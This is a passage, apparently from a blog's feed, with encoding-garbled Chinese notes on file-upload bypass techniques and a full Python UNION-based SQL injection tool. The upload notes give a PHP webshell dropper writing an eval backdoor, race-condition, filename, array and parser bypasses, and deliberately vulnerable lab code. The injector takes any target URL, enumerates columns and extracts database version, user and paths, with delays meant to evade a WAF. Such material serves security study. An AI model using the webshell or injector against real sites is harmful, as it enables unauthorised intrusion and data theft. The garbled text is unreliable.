//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰            $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;            imagegif($im,$img_path);            @unlink($target_path);            $is_upload = true;        &#125;    &#125; else &#123;        $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;;    &#125;&#125;else&#123;    $msg = &quot;åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼&quot;;&#125;</code></pre><p>}</p><h2 id="2-5-18-æ–‡ä»¶ä¸Šä¼ æ¡ä»¶ç«äº‰æ¼æ´ç»•è¿‡"><a href="#2-5-18-æ–‡ä»¶ä¸Šä¼ æ¡ä»¶ç«äº‰æ¼æ´ç»•è¿‡" class="headerlink" title="2.5.18 æ–‡ä»¶ä¸Šä¼ æ¡ä»¶ç«äº‰æ¼æ´ç»•è¿‡"></a>2.5.18 æ–‡ä»¶ä¸Šä¼ æ¡ä»¶ç«äº‰æ¼æ´ç»•è¿‡</h2><h3 id="æ–‡ä»¶ä¸Šä¼ æ¡ä»¶ç«äº‰æ¼æ´ç»•è¿‡æ–¹æ³•"><a href="#æ–‡ä»¶ä¸Šä¼ æ¡ä»¶ç«äº‰æ¼æ´ç»•è¿‡æ–¹æ³•" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¡ä»¶ç«äº‰æ¼æ´ç»•è¿‡æ–¹æ³•"></a>æ–‡ä»¶ä¸Šä¼ æ¡ä»¶ç«äº‰æ¼æ´ç»•è¿‡æ–¹æ³•</h3><p>ç”Ÿæˆå°é©¬ï¼š<br>1.php <?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["a"])?>â€˜);?&gt;</p><p>ä¸Šä¼  php åé—¨è„šæœ¬ï¼Œä¸Šä¼ ä¹‹åç”¨ burpsutie è®¾ç½®è®¿é—®ï¼Œçº¿ç¨‹å»ºè®®ä½“æé«˜ä¸€äº›ã€‚</p><p>æŠ“åŒ…ä¸Šä¼  php æ–‡ä»¶ è®¾ç½®å˜é‡å¯ä»¥æ˜¯æ•°å€¼ï¼Œä¹Ÿå¯ä»¥æ˜¯nullï¼Œä¸åœçš„æäº¤è¿™åŒ…</p><h3 id="æ–‡ä»¶ä¸Šä¼ æ¡ä»¶ç«äº‰æ¼æ´ç»•è¿‡"><a href="#æ–‡ä»¶ä¸Šä¼ æ¡ä»¶ç«äº‰æ¼æ´ç»•è¿‡" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¡ä»¶ç«äº‰æ¼æ´ç»•è¿‡"></a>æ–‡ä»¶ä¸Šä¼ æ¡ä»¶ç«äº‰æ¼æ´ç»•è¿‡</h3><h3 id="æ–‡ä»¶ä¸Šä¼ æ¡ä»¶ç«äº‰æ¼æ´ç»•è¿‡ä»£ç åˆ†æ"><a href="#æ–‡ä»¶ä¸Šä¼ æ¡ä»¶ç«äº‰æ¼æ´ç»•è¿‡ä»£ç åˆ†æ" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¡ä»¶ç«äº‰æ¼æ´ç»•è¿‡ä»£ç åˆ†æ"></a>æ–‡ä»¶ä¸Šä¼ æ¡ä»¶ç«äº‰æ¼æ´ç»•è¿‡ä»£ç åˆ†æ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ–‡ä»¶å…ˆåˆ°æœåŠ¡å™¨ï¼Œç„¶ååˆ¤æ–­æ˜¯å¦åˆæ³•ï¼Œåœ¨è¿™å…¶ä¸­æœ‰çŸ­æš‚çš„æ—¶é—´èƒ½å¤Ÿè®©æˆ‘ä»¬è®¿é—®ï¼Œçº¿ç¨‹æ•°è¿‡å¤šæ—¶ï¼Œæ²¡å¤„ç†è¿‡æ¥</p><h2 id="2-5-19-æ–‡ä»¶åå¯æ§ç»•è¿‡ä¸Šä¼ "><a href="#2-5-19-æ–‡ä»¶åå¯æ§ç»•è¿‡ä¸Šä¼ " class="headerlink" title="2.5.19 æ–‡ä»¶åå¯æ§ç»•è¿‡ä¸Šä¼ "></a>2.5.19 æ–‡ä»¶åå¯æ§ç»•è¿‡ä¸Šä¼ </h2><p>pass-20</p><h3 id="æ–‡ä»¶åå¯æ§ç»•è¿‡ä¸Šä¼ æ–¹æ³•"><a href="#æ–‡ä»¶åå¯æ§ç»•è¿‡ä¸Šä¼ æ–¹æ³•" class="headerlink" title="æ–‡ä»¶åå¯æ§ç»•è¿‡ä¸Šä¼ æ–¹æ³•"></a>æ–‡ä»¶åå¯æ§ç»•è¿‡ä¸Šä¼ æ–¹æ³•</h3><ul><li>å¯æ§æ–‡ä»¶åååŠ    &#x3D;&#x3D;â€˜.â€™    â€˜ â€˜    â€˜. â€˜   â€˜.â€˜&#x3D;&#x3D;éƒ½å¯è¡Œå‰ä¸‰ä¸ªä¸windowsç³»ç»Ÿç‰¹å¾æœ‰å…³ï¼Œåä¸€ä¸ªæ˜¯ç”±äºmoveç§»åŠ¨æ–‡ä»¶çš„å‡½æ•°ä¼šå°†å…¶è¿‡æ»¤</li><li>ä¸Šä¼ æ•°æ®åŒ…ï¼Œä¸Šä¼ æ–‡ä»¶ä¸ºjpgæ–‡ä»¶1.jpgï¼ŒæŠ“åŒ…æ”¹åä¸º1.php .jpg,ç„¶åå°†ç©ºæ ¼è½¬æ¢ä¸ºç©ºï¼Œä¹Ÿå°±æ˜¯åå…­è¿›åˆ¶ä¸º00ï¼Œç©ºæ ¼åå…­è¿›åˆ¶ä¸º20ï¼Œåè¿›åˆ¶ä¸º32ï¼›</li><li>åŒæ ·åˆ©ç”¨ï¼Œwindowsç³»ç»Ÿç‰¹å¾å¯æŠ“åŒ…å°†æ–‡ä»¶ååç¼€åŠ ä¸Š::$DATA</li></ul><h3 id="æ–‡ä»¶åå¯æ§ç»•è¿‡ä¸Šä¼ åŸç†"><a href="#æ–‡ä»¶åå¯æ§ç»•è¿‡ä¸Šä¼ åŸç†" class="headerlink" title="æ–‡ä»¶åå¯æ§ç»•è¿‡ä¸Šä¼ åŸç†"></a>æ–‡ä»¶åå¯æ§ç»•è¿‡ä¸Šä¼ åŸç†</h3><p>æ–‡ä»¶ä¸Šä¼ æ—¶,æ–‡ä»¶åçš„å¯è¢«å®¢æˆ·ç«¯ä¿®æ”¹æ§åˆ¶,ä¼šå¯¼è‡´æ¼æ´äº§ç”Ÿã€‚</p><h3 id="æ–‡ä»¶åå¯æ§ç»•è¿‡ä¸Šä¼ ä»£ç åˆ†æ"><a href="#æ–‡ä»¶åå¯æ§ç»•è¿‡ä¸Šä¼ ä»£ç åˆ†æ" class="headerlink" title="æ–‡ä»¶åå¯æ§ç»•è¿‡ä¸Šä¼ ä»£ç åˆ†æ"></a>æ–‡ä»¶åå¯æ§ç»•è¿‡ä¸Šä¼ ä»£ç åˆ†æ</h3><p>å…ˆåˆ¤æ–­å†ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œæ•…ä¸å­˜åœ¨ç«äº‰<br>é‡‡ç”¨é»‘åå•é™åˆ¶ä¸Šä¼ æ–‡ä»¶,ä½†æ˜¯ $_POST[â€˜save_nameâ€™]æ–‡ä»¶æ˜¯å¯æ§çš„,å¯è¢«å®¢æˆ·ç«¯ä»»æ„ä¿®æ”¹,é€ æˆå®‰å…¨æ¼æ´</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-5-20-æ•°ç»„ç»•è¿‡æ”»å‡»æ–¹æ³•"><a href="#2-5-20-æ•°ç»„ç»•è¿‡æ”»å‡»æ–¹æ³•" class="headerlink" title="2.5.20 æ•°ç»„ç»•è¿‡æ”»å‡»æ–¹æ³•"></a>2.5.20 æ•°ç»„ç»•è¿‡æ”»å‡»æ–¹æ³•</h2><h3 id="æ•°ç»„ç»•è¿‡æ”»å‡»æ–¹æ³•æ–¹æ³•"><a href="#æ•°ç»„ç»•è¿‡æ”»å‡»æ–¹æ³•æ–¹æ³•" class="headerlink" title="æ•°ç»„ç»•è¿‡æ”»å‡»æ–¹æ³•æ–¹æ³•"></a>æ•°ç»„ç»•è¿‡æ”»å‡»æ–¹æ³•æ–¹æ³•</h3><p>ä¸Šä¼ phpæ–‡ä»¶ï¼ŒæŠ“åŒ…ä¿®æ”¹conten-typeï¼Œå¹¶ä¸”ä¿®æ”¹save_nameä¸ºsave_name[0]ï¼Œå€¼ä¸º1.php<br>ç„¶åå¤åˆ¶ï¼Œå˜ä¸ºsave_name[3]ï¼Œå€¼ä¸ºjpg&#x2F;png&#x2F;jifï¼ˆå¤§äº2å°±è¡Œï¼‰</p><h3 id="æ•°ç»„ç»•è¿‡æ”»å‡»æ–¹æ³•åŸç†"><a href="#æ•°ç»„ç»•è¿‡æ”»å‡»æ–¹æ³•åŸç†" class="headerlink" title="æ•°ç»„ç»•è¿‡æ”»å‡»æ–¹æ³•åŸç†"></a>æ•°ç»„ç»•è¿‡æ”»å‡»æ–¹æ³•åŸç†</h3><p>æœ‰çš„æ–‡ä»¶ä¸Šä¼ ï¼Œå¦‚æœæ”¯æŒæ•°ç»„ä¸Šä¼ æˆ–è€…æ•°ç»„å‘½åã€‚å¦‚æœé€»è¾‘å†™çš„æœ‰é—®é¢˜ä¼šé€ æˆå®‰å…¨éšæ‚£ï¼Œå¯¼è‡´ä¸å¯é¢„æœŸçš„ä¸Šä¼ ã€‚è¿™ç§ä¸Šä¼ æ”»å‡»ï¼Œå®ƒæ˜¯å±äºæ”»å‡»è€…ç™½ç›’å®¡è®¡åå‘ç°çš„æ¼æ´å±…å¤š</p><h3 id="æ•°ç»„ç»•è¿‡æ”»å‡»æ–¹æ³•ä»£ç åˆ†æ"><a href="#æ•°ç»„ç»•è¿‡æ”»å‡»æ–¹æ³•ä»£ç åˆ†æ" class="headerlink" title="æ•°ç»„ç»•è¿‡æ”»å‡»æ–¹æ³•ä»£ç åˆ†æ"></a>æ•°ç»„ç»•è¿‡æ”»å‡»æ–¹æ³•ä»£ç åˆ†æ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//æ£€æŸ¥MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//æ£€æŸ¥æ–‡ä»¶å</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1.php<br>1<br>php<br>file[0]&#x3D;1;<br>file[1]&#x3D;php;<br>ä»¤ä¸€ä¸ªfile[3]&#x3D;jpg;<br>åˆ™end($file)&#x3D;jpg;<br>è€Œ$file[count($file) - 1]&#x3D;null&#x3D;$file[2];<br>countä¸ºå®é™…æœ‰æ•ˆå€¼ï¼Œåªæœ‰ä¸‰ä¸ª<br>åˆ$file[2]æ²¡æœ‰å€¼ï¼Œä¸ºnull</p><h2 id="2-5-21-æ–‡ä»¶ä¸Šä¼ å…¶ä»–æ¼æ´"><a href="#2-5-21-æ–‡ä»¶ä¸Šä¼ å…¶ä»–æ¼æ´" class="headerlink" title="2.5.21 æ–‡ä»¶ä¸Šä¼ å…¶ä»–æ¼æ´"></a>2.5.21 æ–‡ä»¶ä¸Šä¼ å…¶ä»–æ¼æ´</h2><p>nginx 0.83 &#x2F;1.jpg%00php</p><p>apahce 1x æˆ–è€… 2x</p><p>å½“ apache é‡è§ä¸è®¤è¯†çš„åç¼€åï¼Œä¼šä»åå‘å‰è§£æä¾‹å¦‚ 1.php.rar ä¸è®¤è¯† rar å°±å‘å‰è§£æï¼Œç›´åˆ°çŸ¥é“å®ƒè®¤pass-19</p><p>è¯†çš„åç¼€åã€‚</p><p>phpcgi æ¼æ´(nginx iis7 æˆ–è€…ä»¥ä¸Š) ä¸Šä¼ å›¾ç‰‡å 1.jpgã€‚è®¿é—® 1.jpg&#x2F;1.php ä¹Ÿä¼šè§£ææˆ phpã€‚</p><p>Apache HTTPD æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰</p><p>apache é€šè¿‡ mod_php æ¥è¿è¡Œè„šæœ¬ï¼Œå…¶ 2.4.0-2.4.29 ä¸­å­˜åœ¨apache æ¢è¡Œè§£ææ¼æ´ï¼Œåœ¨è§£æphp æ—¶ xxx.php\x0A</p><p>å°†è¢«æŒ‰ç…§ PHP åç¼€è¿›è¡Œè§£æï¼Œå¯¼è‡´ç»•è¿‡ä¸€äº›æœåŠ¡å™¨çš„å®‰å…¨ç­–ç•¥ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> upload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlè‡ªåŠ¨åŒ–æ³¨å…¥è„šæœ¬union</title>
      <link href="/2025/05/04/sql%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%ACunion/"/>
      <url>/2025/05/04/sql%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%ACunion/</url>
      
        <content type="html"><![CDATA[<p>import requests<br>import time<br>from urllib.parse import urljoin, quote</p><p>class UnionInjector:<br>    def <strong>init</strong>(self, url):<br>        self.url &#x3D; url<br>        self.headers &#x3D; {<br>            â€˜User-Agentâ€™: â€˜Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36â€™<br>        }<br>        self.timeout &#x3D; 10<br>        self.delay &#x3D; 1  # è¯·æ±‚é—´éš”ï¼Œé¿å…è§¦å‘WAF</p><pre><code>def test_columns(self, param_name, max_columns=10):    print(&quot;[*] å¼€å§‹æµ‹è¯•åˆ—æ•°...&quot;)    for i in range(1, max_columns + 1):        # æ„é€ NULLè”åˆæŸ¥è¯¢        nulls = &#39;,&#39;.join([&#39;NULL&#39;] * i)        payload = f&quot;&#39; UNION SELECT &#123;nulls&#125;-- -&quot;        encoded_payload = quote(payload)                try:            response = self.send_request(param_name, encoded_payload)                        # å¦‚æœé¡µé¢æ­£å¸¸è¿”å›ï¼Œå¯èƒ½æ‰¾åˆ°æ­£ç¡®çš„åˆ—æ•°            if response and response.status_code == 200:                print(f&quot;[+] å¯èƒ½çš„åˆ—æ•°: &#123;i&#125;&quot;)                print(f&quot;[+] ä½¿ç”¨çš„Payload: &#123;payload&#125;&quot;)                return i                            time.sleep(self.delay)  # è¯·æ±‚é—´éš”                    except Exception as e:            print(f&quot;[-] æµ‹è¯•åˆ—æ•° &#123;i&#125; æ—¶å‡ºé”™: &#123;str(e)&#125;&quot;)            continue        return Nonedef test_string_column(self, param_name, num_columns):    print(&quot;\n[*] å¼€å§‹æµ‹è¯•å­—ç¬¦ä¸²åˆ—...&quot;)    test_str = &#39;TRAE&#39;        for i in range(1, num_columns + 1):        # æ„é€ æµ‹è¯•å­—ç¬¦ä¸²çš„æŸ¥è¯¢        columns = [&#39;NULL&#39;] * num_columns        columns[i-1] = f&quot;&#39;&#123;test_str&#125;&#39;&quot;        payload = f&quot;&#39; UNION SELECT &#123;&#39;,&#39;.join(columns)&#125;-- -&quot;        encoded_payload = quote(payload)                try:            response = self.send_request(param_name, encoded_payload)                        if response and response.status_code == 200:                if test_str in response.text:                    print(f&quot;[+] å‘ç°å­—ç¬¦ä¸²åˆ—: &#123;i&#125;&quot;)                    print(f&quot;[+] ä½¿ç”¨çš„Payload: &#123;payload&#125;&quot;)                    return i                                time.sleep(self.delay)                    except Exception as e:            print(f&quot;[-] æµ‹è¯•å­—ç¬¦ä¸²åˆ— &#123;i&#125; æ—¶å‡ºé”™: &#123;str(e)&#125;&quot;)            continue        return Nonedef extract_data(self, param_name, num_columns, string_column):    print(&quot;\n[*] å¼€å§‹æå–æ•°æ®...&quot;)        # å¸¸ç”¨çš„æ•°æ®åº“ä¿¡æ¯æŸ¥è¯¢    queries = [        &quot;version()&quot;,           # æ•°æ®åº“ç‰ˆæœ¬        &quot;database()&quot;,          # å½“å‰æ•°æ®åº“        &quot;user()&quot;,              # å½“å‰ç”¨æˆ·        &quot;@@datadir&quot;,          # æ•°æ®åº“è·¯å¾„        &quot;system_user()&quot;,       # ç³»ç»Ÿç”¨æˆ·        &quot;session_user()&quot;      # ä¼šè¯ç”¨æˆ·    ]        for query in queries:        columns = [&#39;NULL&#39;] * num_columns        columns[string_column-1] = query        payload = f&quot;&#39; UNION SELECT &#123;&#39;,&#39;.join(columns)&#125;-- -&quot;        encoded_payload = quote(payload)                try:            response = self.send_request(param_name, encoded_payload)                        if response and response.status_code == 200:                print(f&quot;[+] &#123;query&#125;: &#123;response.text&#125;&quot;)                            time.sleep(self.delay)                    except Exception as e:            print(f&quot;[-] æå– &#123;query&#125; æ—¶å‡ºé”™: &#123;str(e)&#125;&quot;)            continuedef send_request(self, param_name, payload):    test_url = f&quot;&#123;self.url&#125;?&#123;param_name&#125;=&#123;payload&#125;&quot;    return requests.get(        test_url,        headers=self.headers,        timeout=self.timeout    )</code></pre><p>def main():<br>    print(â€œUNIONè”åˆæ³¨å…¥æµ‹è¯•å·¥å…·â€)<br>    print(â€œ&#x3D;â€ * 50)</p><pre><code>while True:    url = input(&quot;\nè¯·è¾“å…¥ç›®æ ‡URL (è¾“å…¥qé€€å‡º): &quot;)    if url.lower() == &#39;q&#39;:        break            if not url.startswith((&#39;http://&#39;, &#39;https://&#39;)):        url = &#39;http://&#39; + url            param_name = input(&quot;è¯·è¾“å…¥å‚æ•°å: &quot;)        injector = UnionInjector(url)        # 1. æµ‹è¯•åˆ—æ•°    num_columns = injector.test_columns(param_name)    if not num_columns:        print(&quot;[-] æœªèƒ½ç¡®å®šåˆ—æ•°&quot;)        continue            # 2. æµ‹è¯•å­—ç¬¦ä¸²åˆ—    string_column = injector.test_string_column(param_name, num_columns)    if not string_column:        print(&quot;[-] æœªèƒ½æ‰¾åˆ°å­—ç¬¦ä¸²åˆ—&quot;)        continue            # 3. æå–æ•°æ®    injector.extract_data(param_name, num_columns, string_column)</code></pre><p>if <strong>name</strong> &#x3D;&#x3D; â€œ<strong>main</strong>â€œ:<br>    main()</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQLæ³¨å…¥ç›¸å…³çŸ¥è¯†</title>
      <link href="/2025/04/20/SQL%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2025/04/20/SQL%E6%B3%A8%E5%85%A5/SQL%E6%B3%A8%E5%85%A5/</url>
      
